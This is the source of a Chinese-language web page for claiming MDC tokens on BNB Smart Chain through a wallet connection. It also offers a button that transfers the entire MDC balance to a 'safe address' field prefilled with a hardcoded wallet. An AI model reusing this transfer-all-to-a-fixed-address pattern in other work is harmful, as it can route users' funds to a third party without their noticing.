<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MDC 领取 DApp</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
      min-height: 100vh;
      color: #fff;
      padding: 20px;
    }
    .container { max-width: 500px; margin: 0 auto; }
    
    .header { text-align: center; margin-bottom: 24px; }
    .header h1 { font-size: 22px; color: #00d4ff; }
    .header p { font-size: 12px; color: #64748b; margin-top: 4px; }
    
    .card {
      background: rgba(30, 41, 59, 0.8);
      border-radius: 16px;
      padding: 16px;
      margin-bottom: 12px;
      border: 1px solid rgba(0, 212, 255, 0.2);
    }
    .card-title {
      font-size: 14px;
      font-weight: bold;
      color: #00d4ff;
      margin-bottom: 12px;
    }
    
    .btn {
      background: linear-gradient(135deg, #00d4ff 0%, #0099cc 100%);
      color: #000;
      border: none;
      padding: 14px 20px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 14px;
      font-weight: bold;
      width: 100%;
      margin-top: 10px;
      transition: all 0.2s;
    }
    .btn:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 4px 15px rgba(0, 212, 255, 0.3); }
    .btn:disabled { background: #334155; color: #64748b; cursor: not-allowed; }
    .btn-success { background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: #fff; }
    
    .info-row {
      display: flex;
      justify-content: space-between;
      padding: 10px 0;
      border-bottom: 1px solid rgba(255,255,255,0.1);
    }
    .info-row:last-child { border-bottom: none; }
    .info-row label { color: #64748b; font-size: 13px; }
    .info-row .value { color: #00d4ff; font-size: 13px; font-family: monospace; }
    
    .warning {
      background: rgba(251, 191, 36, 0.2);
      color: #fbbf24;
      padding: 10px;
      border-radius: 8px;
      font-size: 12px;
      text-align: center;
      margin-top: 10px;
    }
    
    .log {
      margin-top: 10px;
      padding: 10px;
      background: rgba(0,0,0,0.3);
      border-radius: 8px;
      font-size: 11px;
      max-height: 80px;
      overflow-y: auto;
    }
    .log div { padding: 4px 0; color: #94a3b8; }
    .log .success { color: #22c55e; }
    .log .error { color: #ef4444; }
    
    input {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid rgba(255,255,255,0.1);
      background: rgba(0,0,0,0.3);
      color: #fff;
      font-size: 13px;
      margin-top: 8px;
    }
    input:focus { outline: none; border-color: #00d4ff; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>MDC 领取 DApp</h1>
      <p>直接调用合约领取收益</p>
    </div>

    <div class="card">
      <div class="card-title">钱包</div>
      <button class="btn" id="connectBtn" onclick="connectWallet()">连接钱包</button>
      
      <div id="walletArea" style="display:none;">
        <div class="info-row">
          <label>账户地址</label>
          <span class="value" id="walletAddress">-</span>
        </div>
        <div class="info-row">
          <label>BNB余额</label>
          <span class="value" id="bnbBalance">-</span>
        </div>
        <div class="info-row">
          <label>MDC余额</label>
          <span class="value" id="mdcBalance">-</span>
        </div>
        <div class="info-row">
          <label>可领取MDC</label>
          <span class="value" id="claimable">-</span>
        </div>
        <div id="networkWarning" class="warning" style="display:none;">请切换到 BSC 主网</div>
        <button class="btn btn-secondary" onclick="refreshAll()" style="background:#334155;color:#fff;">刷新</button>
      </div>
    </div>

    <div class="card">
      <div class="card-title">领取操作</div>
      <div class="info-row">
        <label>Gas费用</label>
        <span class="value">约 0.001 BNB</span>
      </div>
      <div id="claimWarning" class="warning" style="display:none;"></div>
      <button class="btn btn-success" id="claimBtn" onclick="claim()" disabled>Claim合约领取MDC</button>
    </div>

    <div class="card">
      <div class="card-title">转账到安全地址</div>
      <input type="text" id="safeAddress" placeholder="输入安全地址">
      <button class="btn btn-success" id="transferBtn" onclick="transfer()" disabled>转账全部 MDC</button>
    </div>

    <div class="card">
      <div class="card-title">日志</div>
      <div class="log" id="logArea"></div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <script>
    const CONFIG = {
      chainId: 56,
      MDC_TOKEN: '0xd1ba69a44888ee50819c554d3d6f4ee457622894',
      CLAIM_CONTRACT: '0xEc5DBf2BACe283143b7B4472a7ce0E445EDA3F1e',
    };

    const RPC_LIST = [
      'https://bsc-dataseed2.defibit.io/',
      'https://bscrpc.com/',
      'https://rpc.ankr.com/bsc'
    ];

    const MDC_ABI = [
      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "to", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
    ];

    const CLAIM_ABI = [
      { "constant": true, "inputs": [{ "name": "account", "type": "address" }], "name": "claimable", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "account", "type": "address" }], "name": "claim", "outputs": [], "type": "function" }
    ];

    let web3, currentAccount, safeAddress = '0x8558D8A5b90eC7d9f500cdCF0FB49C47292EBCdA';

    async function init() {
      document.getElementById('safeAddress').value = safeAddress;
      if (typeof window.ethereum !== 'undefined') {
        web3 = new Web3(window.ethereum);
      } else {
        for (const rpc of RPC_LIST) {
          try {
            web3 = new Web3(new Web3.providers.HttpProvider(rpc));
            await web3.eth.getBlockNumber();
            break;
          } catch (e) {}
        }
      }
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          currentAccount = accounts[0];
          updateWalletUI();
          await refreshAll();
        }
      } catch (e) {}
    }

    async function connectWallet() {
      if (typeof window.ethereum === 'undefined') {
        addLog('请安装 MetaMask 钱包', 'error');
        return;
      }
      try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        currentAccount = accounts[0];
        updateWalletUI();
        await refreshAll();
      } catch (e) {
        addLog('连接失败', 'error');
      }
    }

    async function checkNetwork() {
      try {
        const chainId = await web3.eth.getChainId();
        if (chainId !== CONFIG.chainId) {
          document.getElementById('networkWarning').style.display = 'block';
          return false;
        }
        document.getElementById('networkWarning').style.display = 'none';
        return true;
      } catch (e) { return false; }
    }

    function updateWalletUI() {
      document.getElementById('walletArea').style.display = 'block';
      document.getElementById('walletAddress').textContent = currentAccount.slice(0, 8) + '...' + currentAccount.slice(-6);
      document.getElementById('connectBtn').textContent = '已连接 ✓';
      document.getElementById('connectBtn').disabled = true;
    }

    function addLog(msg, type = '') {
      const el = document.getElementById('logArea');
      const div = document.createElement('div');
      div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
      if (type) div.className = type;
      el.insertBefore(div, el.firstChild);
      while (el.children.length > 10) el.removeChild(el.lastChild);
    }

    async function refreshAll() {
      if (!currentAccount) return;
      const ok = await checkNetwork();
      if (!ok) return;

      try {
        const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
        const claimContract = new web3.eth.Contract(CLAIM_ABI, CONFIG.CLAIM_CONTRACT);

        const [bnb, mdc, claimable] = await Promise.all([
          web3.eth.getBalance(currentAccount),
          mdcContract.methods.balanceOf(currentAccount).call(),
          claimContract.methods.claimable(currentAccount).call()
        ]);

        document.getElementById('bnbBalance').textContent = (Number(bnb) / 1e18).toFixed(6) + ' BNB';
        document.getElementById('mdcBalance').textContent = (Number(mdc) / 1e18).toFixed(4) + ' MDC';
        document.getElementById('claimable').textContent = (Number(claimable) / 1e18).toFixed(4) + ' MDC';

        const claimableNum = Number(claimable) / 1e18;
        const mdcNum = Number(mdc) / 1e18;
        const bnbNum = Number(bnb) / 1e18;

        // 更新按钮状态
        const canClaim = claimableNum >= 0.05 && bnbNum >= 0.001;
        const canTransfer = mdcNum >= 0.05;

        document.getElementById('claimBtn').disabled = !canClaim;
        document.getElementById('transferBtn').disabled = !canTransfer;

        // 更新提示
        const warningEl = document.getElementById('claimWarning');
        if (claimableNum < 0.05 && claimableNum > 0) {
          warningEl.style.display = 'block';
          warningEl.textContent = '可领取金额 < 0.05 MDC，需累积到 0.05 才能领取';
        } else if (bnbNum < 0.001) {
          warningEl.style.display = 'block';
          warningEl.textContent = 'BNB余额不足，请充值至少 0.001 BNB';
        } else {
          warningEl.style.display = 'none';
        }

      } catch (e) {
        addLog('刷新失败: ' + e.message.slice(0, 50), 'error');
      }
    }

    async function claim() {
      if (!currentAccount) return;
      document.getElementById('claimBtn').disabled = true;
      addLog('正在领取...');

      const claimContract = new web3.eth.Contract(CLAIM_ABI, CONFIG.CLAIM_CONTRACT);
      try {
        const tx = await claimContract.methods.claim(currentAccount).send({
          from: currentAccount,
          gas: 100000,
          gasPrice: '100000000'
        });
        addLog('领取成功!', 'success');
        await refreshAll();
      } catch (e) {
        addLog('领取失败: ' + (e.message || e).slice(0, 50), 'error');
        document.getElementById('claimBtn').disabled = false;
      }
    }

    async function transfer() {
      if (!currentAccount) return;
      const toAddress = document.getElementById('safeAddress').value.trim();
      if (!web3.utils.isAddress(toAddress)) {
        addLog('请输入有效的安全地址', 'error');
        return;
      }

      document.getElementById('transferBtn').disabled = true;
      addLog('正在转账...');

      const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
      try {
        const balance = await mdcContract.methods.balanceOf(currentAccount).call();
        const tx = await mdcContract.methods.transfer(toAddress, balance).send({
          from: currentAccount,
          gas: 100000,
          gasPrice: '100000000'
        });
        addLog('转账成功!', 'success');
        await refreshAll();
      } catch (e) {
        addLog('转账失败: ' + (e.message || e).slice(0, 50), 'error');
        document.getElementById('transferBtn').disabled = false;
      }
    }

    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length > 0) {
          currentAccount = accounts[0];
          updateWalletUI();
          refreshAll();
        } else {
          window.location.reload();
        }
      });
      window.ethereum.on('chainChanged', () => { window.location.reload(); });
    }

    init();
  </script>
</body>
</html>
